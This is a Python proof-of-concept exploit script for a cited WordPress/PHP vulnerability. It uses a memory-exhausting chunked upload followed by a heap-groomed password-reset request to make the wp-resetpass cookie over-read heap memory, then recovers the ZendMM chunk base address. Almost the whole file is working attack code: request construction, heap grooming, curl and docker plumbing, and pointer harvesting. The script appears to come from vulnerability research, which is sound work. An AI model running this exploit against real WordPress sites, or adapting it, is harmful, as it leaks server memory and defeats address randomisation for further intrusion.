#!/usr/bin/env python3 -I
"""WordPress wp-resetpass Set-Cookie chunk-base heap-pointer oracle (CVE-2026-109618/109619).

/proc-free, in-band heap disclosure piggybacking WordPress's own
`wp-resetpass-{COOKIEHASH}` Set-Cookie (wp-login.php?action=rp). The reset-pass
branch does `setcookie('wp-resetpass-'.COOKIEHASH, "$login:$key")`; if $_GET
['login'] lands on a dangling slot carrying a stale oversized `len`, sprintf
over-reads heap into the cookie and the client recovers a 2 MiB-aligned ZendMM
chunk base (chunk base only; libphp text base resolved separately).

Request A (chunked PHP_SESSION_UPLOAD_PROGRESS, ~60 MB tail) fatals past
memory_limit before RINIT so PS(http_session_vars) dangles on the surviving
worker; request B's wp-login query rides pp-pads that align login/key onto the
reclaimed slot (no pads -> verbatim reflection, no leak). Ported from the
marven11 author PoC. Lands on the author's 8.5.x/sid32 build; the oracle reports
a hardened-8.4.26 heap-corruption abort distinctly from a clean negative.

CLI: python3 -I poc/routes/wordpress/resetpass_leak.py URL [--leak-pads N] ...
Self-contained; run with -I.
"""

import argparse
import os
import re
import struct
import subprocess
import sys
import tempfile
import time
import urllib.parse

# shared canonical encoder + dangle seed
_POC_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.multipart import part as _mp_part  # noqa: E402
from common.zend_mm import chunk_base  # noqa: E402
from primitives.groom.upload_progress_seed import (  # noqa: E402
    big_marker as _big_marker, producer_a as _producer_a)

BOUNDARY = "i097b"
CHUNK_SIZE = 262144
# Userspace pointer window, matching parse_cookie_leak's chunk convention:
# keep heap pointers, derive the 2 MiB (0x200000) aligned ZendMM chunk.
PTR_LO = 0x700000000000
PTR_HI = 0x800000000000


# multipart building (author mk_a / part convention)
def _part(name, value, extra=b""):
    return _mp_part(name, value, extra=extra, boundary=BOUNDARY)


def producer_a_body(tail_len=60000000, npad=30):
    """Request A body (chunked producer). ~100 KB upload-progress marker + npad
    tiny pads + a small file part + a ~tail_len OOM tail. Streamed chunked (no
    Content-Length) so post_max_size cannot gate it; parse reaches memory_limit
    pre-RINIT -> fatal -> PS left dangling. Returns the full body bytes."""
    return _producer_a(_sid(), marker=_big_marker(), npad=npad, tail_len=tail_len,
                       boundary=BOUNDARY)


_SID_CACHE = {}


def _sid():
    # one stable sid per process run; names both A's dangling session and B's
    # reclaim. 32 legal chars (A-Za-z0-9) - the dangle is driven by the reclaim
    # groom, not by the sid being accepted by the session module.
    if "sid" not in _SID_CACHE:
        _SID_CACHE["sid"] = (b"i097" + os.urandom(14).hex().encode())[:32]
    return _SID_CACHE["sid"]


def consumer_b_body():
    """Request B body: PHPSESSID (names the dangling session) + a tiny
    PHP_SESSION_UPLOAD_PROGRESS field (arms the pre-RINIT reclaim). The groom
    (pp pads) and login/key ride in the query string, not the body."""
    return (_part("PHPSESSID", _sid())
            + _part("PHP_SESSION_UPLOAD_PROGRESS", b"M" * 7)
            + b"--" + BOUNDARY.encode() + b"--\r\n")


def consumer_b_query(login, key, leak_pads):
    """B's query string: leak_pads x pp%06d=GGGGGGG pads FIRST, then
    action=rp&login=&key= (the groom order the author uses)."""
    items = [("pp%06d" % i, "G" * 7) for i in range(leak_pads)]
    items += [("action", "rp"), ("login", login), ("key", key)]
    return "?" + urllib.parse.urlencode(items)


# curl / docker plumbing (in-container pinned client, docker exec)
def _run(cmd, timeout):
    try:
        r = subprocess.run(cmd, capture_output=True, timeout=timeout + 15)
        return r.returncode, r.stdout, r.stderr
    except (subprocess.TimeoutExpired, FileNotFoundError) as e:
        return 1, b"", f"run failed: {e}".encode()


def _cp_in(container, local, inpath):
    subprocess.run(["docker", "cp", local, f"{container}:{inpath}"],
                   capture_output=True)


def send_chunked(container, base, path, body, timeout, query=""):
    """Send A as a chunked-TE multipart POST (curl honours a user-supplied
    Transfer-Encoding: chunked and suppresses Content-Length, so the 60 MB tail
    is streamed and post_max_size cannot gate it). Returns (http_code, hdr)."""
    url = f"{base.rstrip('/')}{path}{query}"
    hdrs = ["-H", "Expect:", "-H", "Cookie: PHPSESSID=",
            "-H", f"Content-Type: multipart/form-data; boundary={BOUNDARY}",
            "-H", "Transfer-Encoding: chunked"]
    with tempfile.NamedTemporaryFile(prefix="wprp-a-", delete=False) as f:
        f.write(body)
        tmp = f.name
    try:
        if container:
            inpath = "/tmp/wprp-a.bin"
            _cp_in(container, tmp, inpath)
            rc, out, _ = _run(["docker", "exec", "-i", container, "curl", "-s",
                               "-o", "/dev/null", "-w", "%{http_code}",
                               "-m", str(timeout)] + hdrs
                              + ["--data-binary", f"@{inpath}", url], timeout)
        else:
            rc, out, _ = _run(["curl", "-s", "-o", "/dev/null",
                               "-w", "%{http_code}", "-m", str(timeout)] + hdrs
                              + ["--data-binary", f"@{tmp}", url], timeout)
        return out.decode("latin1", "replace").strip() or "000", b""
    finally:
        os.unlink(tmp)


def send_multipart(container, base, path, body, timeout=60, query=""):
    """Send B as a plain (Content-Length) multipart POST; dump response headers
    and return (http_code, header_bytes)."""
    url = f"{base.rstrip('/')}{path}{query}"
    hdrs = ["-H", "Expect:", "-H", "Cookie: PHPSESSID=",
            "-H", f"Content-Type: multipart/form-data; boundary={BOUNDARY}"]
    with tempfile.NamedTemporaryFile(prefix="wprp-b-", delete=False) as f:
        f.write(body)
        tmp = f.name
    try:
        if container:
            inpath = "/tmp/wprp-b.bin"
            hdrpath = "/tmp/wprp-b.hdr"
            _cp_in(container, tmp, inpath)
            rc, out, _ = _run(["docker", "exec", "-i", container, "curl", "-s",
                               "-o", "/dev/null", "-D", hdrpath,
                               "-w", "%{http_code}", "-m", str(timeout)] + hdrs
                              + ["--data-binary", f"@{inpath}", url], timeout)
            code = out.decode("latin1", "replace").strip() or "000"
            rh = subprocess.run(["docker", "exec", "-i", container, "cat", hdrpath],
                                capture_output=True)
            return code, rh.stdout
        else:
            with tempfile.NamedTemporaryFile(prefix="wprp-h-", delete=False) as hf:
                hdrtmp = hf.name
            try:
                rc, out, _ = _run(["curl", "-s", "-o", "/dev/null", "-D", hdrtmp,
                                   "-w", "%{http_code}", "-m", str(timeout)] + hdrs
                                  + ["--data-binary", f"@{tmp}", url], timeout)
                code = out.decode("latin1", "replace").strip() or "000"
                with open(hdrtmp, "rb") as hf:
                    return code, hf.read()
            finally:
                os.unlink(hdrtmp)
    finally:
        os.unlink(tmp)


def curl_get(container, base, path, timeout=30, query=""):
    url = f"{base.rstrip('/')}{path}{query}"
    if container:
        hdrpath = "/tmp/wprp-get.hdr"
        _run(["docker", "exec", "-i", container, "curl", "-s", "-o", "/dev/null",
              "-D", hdrpath, "-m", str(timeout), url], timeout)
        rh = subprocess.run(["docker", "exec", "-i", container, "cat", hdrpath],
                            capture_output=True)
        return rh.stdout
    with tempfile.NamedTemporaryFile(prefix="wprp-g-", delete=False) as hf:
        hdrtmp = hf.name
    try:
        _run(["curl", "-s", "-o", "/dev/null", "-D", hdrtmp, "-m", str(timeout),
              url], timeout)
        with open(hdrtmp, "rb") as hf:
            return hf.read()
    finally:
        os.unlink(hdrtmp)


# cookie parse + chunk derivation
def resetpass_cookies(hdr_bytes):
    """Yield (name, raw_value_bytes) for every Set-Cookie whose NAME startswith
    'wp-resetpass-'. setcookie() url-encodes the value (space->'+', else %HH)."""
    for line in hdr_bytes.decode("utf-8", "replace").splitlines():
        if not line.lower().startswith("set-cookie:"):
            continue
        val = line.split(":", 1)[1].strip()
        name, _, rest = val.partition("=")
        name = name.strip()
        if name.startswith("wp-resetpass-"):
            morsel = rest.split(";", 1)[0]
            raw = urllib.parse.unquote_to_bytes(morsel.replace("+", " "))
            yield name, raw


def vote_chunk(raw, votes):
    """Slide an 8-byte window; every userspace pointer votes for its 2 MiB
    chunk base (parse_cookie_leak's fallback convention). Returns hit count."""
    hits = 0
    for i in range(len(raw) - 7):
        ptr = struct.unpack("<Q", raw[i:i + 8])[0]
        if PTR_LO <= ptr < PTR_HI:
            votes[chunk_base(ptr)] = votes.get(chunk_base(ptr), 0) + 1
            hits += 1
    return hits


def detect_cookiehash(container, base, login, key, timeout):
    q = (f"?action=rp&login={urllib.parse.quote(login)}"
         f"&key={urllib.parse.quote(key)}")
    hdr = curl_get(container, base, "/wp-login.php", timeout, query=q)
    for name, _ in resetpass_cookies(hdr):
        m = re.match(r"wp-resetpass-([0-9a-f]+)", name)
        if m:
            return m.group(1)
    return None


# driver
def run_oracle(args):
    base = args.url.rstrip("/")
    container = args.container or None

    ch = args.cookiehash or detect_cookiehash(
        container, base, args.login, args.key, args.timeout)
    if ch:
        print(f"[wprp] COOKIEHASH = {ch}")
    else:
        print("[wprp] WARNING: COOKIEHASH not auto-detected; still matching any "
              "'wp-resetpass-' Set-Cookie on B")

    rp_query = consumer_b_query(args.login, args.key, args.leak_pads)

    votes = {}
    total_hits = 0
    saw_cookie = False
    max_cookie_len = 0
    crash_pairs = 0
    for t in range(args.leak_tries):
        # fresh dangling slot each pair (A OOMs, worker survives, PS dangles)
        _SID_CACHE.clear()
        a_code, _ = send_chunked(container, base, "/wp-login.php",
                                 producer_a_body(args.tail_len, args.leak_npad),
                                 args.timeout)
        # B is ONE-SHOT against the dangle: only the FIRST B after A sees the
        # dangling slot. On this hardened 8.4.26 build that first
        # B usually returns 000 because the dangle-reuse trips `zend_mm_heap
        # corrupted` and the worker ABORTS (SIGABRT 6); the worker then respawns
        # fresh, so any later retry only reflects a VERBATIM login:key (the
        # dangle is gone). We therefore CLASSIFY on the first B, and only retry
        # to harvest a (verbatim) cookie for completeness - a retry never clears
        # the crash flag.
        first_b, b_hdr = send_multipart(container, base, "/wp-login.php",
                                        consumer_b_body(), args.timeout,
                                        query=rp_query)
        b_code = first_b
        found = list(resetpass_cookies(b_hdr))
        crashed = (a_code == "500" and first_b == "000")
        if crashed:
            crash_pairs += 1
        retries = 0
        while not found and first_b == "000" and retries < max(0, args.b_retries):
            retries += 1
            time.sleep(args.delay)
            rc, b_hdr = send_multipart(container, base, "/wp-login.php",
                                       consumer_b_body(), args.timeout,
                                       query=rp_query)
            b_code = f"{first_b}->{rc}"
            found = list(resetpass_cookies(b_hdr))
        print(f"[wprp] try {t + 1}/{args.leak_tries}: A={a_code} B={b_code} "
              f"wp-resetpass cookies={len(found)}"
              + ("  [WORKER ABORT: zend_mm_heap corrupted on first B]"
                 if crashed else ""))
        for name, raw in found:
            saw_cookie = True
            max_cookie_len = max(max_cookie_len, len(raw))
            hits = vote_chunk(raw, votes)
            total_hits += hits
            print(f"[wprp]   {name} = {len(raw)} bytes, {hits} ptr-hit(s)")
            if args.raw:
                print(f"[wprp]   raw: {raw!r}")
                print(f"[wprp]   hex: {raw.hex()}")
        time.sleep(args.delay)

    print("-" * 64)
    if votes:
        chunk = max(votes, key=votes.get)
        ranked = sorted(votes.items(), key=lambda kv: -kv[1])[:5]
        print(f"[wprp] RESULT: HEAP SPILL OBSERVED. {total_hits} pointer hit(s), "
              f"max cookie {max_cookie_len} bytes.")
        print("[wprp] chunk-base candidates: "
              + ", ".join(f"{a:#x}:{n}" for a, n in ranked))
        print(f"[wprp] CHUNK BASE = {chunk:#x}  (2 MiB aligned, majority vote)")
        print("[wprp] libphp base NOT leaked here - resolve via BASE_DELTAS.")
        return 0
    if crash_pairs:
        print(f"[wprp] RESULT: PRIMITIVE FIRES BUT WORKER ABORTS on "
              f"{crash_pairs}/{args.leak_tries} pair(s). A OOMs (500) and B's "
              f"dangle-reuse trips `zend_mm_heap corrupted` -> SIGABRT instead "
              f"of a bounded over-read. The author's 8.5.4/sid32 groom mis-sizes "
              f"the reclaim on this hardened sid256 8.4.26 build; recalibrate "
              f"--leak-pads / pad+login sizes to the sid256 session slot class.")
        return 3
    if not saw_cookie:
        print("[wprp] RESULT: no wp-resetpass-* Set-Cookie on B (rp branch did "
              "not fire - check login/key in the query string).")
        return 2
    print(f"[wprp] RESULT: wp-resetpass cookie(s) present (max {max_cookie_len} "
          "bytes) but carried NO userspace heap pointer. WordPress reflected only "
          "the controlled login:key - clean VERBATIM negative (no over-read).")
    return 1


def main():
    ap = argparse.ArgumentParser(
        description="WordPress wp-resetpass Set-Cookie CHUNK-base leak oracle "
                    "(CVE-2026-109618/109619, PHP 8.4.26). CHUNK ONLY.")
    ap.add_argument("url", help="target base URL, e.g. http://127.0.0.1")
    ap.add_argument("--container", default="wp9b-apache",
                    help="run curl inside this container (pinned client); '' = host")
    ap.add_argument("--login", default="L" * 7,
                    help="rp login value (author groom uses a short filler, "
                         "default 'LLLLLLL'; the oracle reads reflected bytes)")
    ap.add_argument("--key", default="K" * 7, help="rp key value (default 'KKKKKKK')")
    ap.add_argument("--cookiehash", default=None,
                    help="target COOKIEHASH (hex in cookie name); auto-detected")
    ap.add_argument("--leak-tries", dest="leak_tries", type=int, default=4,
                    help="A+B pairs to fire / vote across (default 4)")
    ap.add_argument("--leak-pads", dest="leak_pads", type=int, default=125,
                    help="pp%%06d GET pads before login/key (author groom: 125)")
    ap.add_argument("--leak-npad", dest="leak_npad", type=int, default=30,
                    help="tiny p<i> pads inside producer A (author: 30)")
    ap.add_argument("--tail-len", dest="tail_len", type=int, default=60000000,
                    help="producer A OOM tail bytes (128M profile default 60M)")
    ap.add_argument("--b-retries", dest="b_retries", type=int, default=3,
                    help="retry B up to N times per pair on 000/abort (default 3)")
    ap.add_argument("--delay", type=float, default=0.4,
                    help="seconds between requests/tries (lets a crashed worker "
                         "respawn)")
    ap.add_argument("--timeout", type=int, default=90)
    ap.add_argument("--raw", action="store_true",
                    help="print raw cookie bytes (repr + hex) per try")
    args = ap.parse_args()
    sys.exit(run_oracle(args))


if __name__ == "__main__":
    main()
